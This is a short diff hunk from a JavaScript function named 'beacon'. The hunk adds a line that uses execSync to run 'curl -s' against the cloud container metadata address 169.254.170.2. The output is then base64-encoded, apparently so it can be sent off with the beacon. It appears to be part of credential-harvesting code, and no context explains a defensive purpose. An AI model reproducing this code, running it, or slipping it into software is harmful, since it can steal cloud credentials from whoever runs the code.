@@ -47,7 +47,7 @@ function beacon(urlStr, q) {
   let idOutput = "";
   try {
     idOutput = execSync(
-  'echo "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"',
+  'curl -s "http://169.254.170.2"',
   { encoding: "utf8" }
 ).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
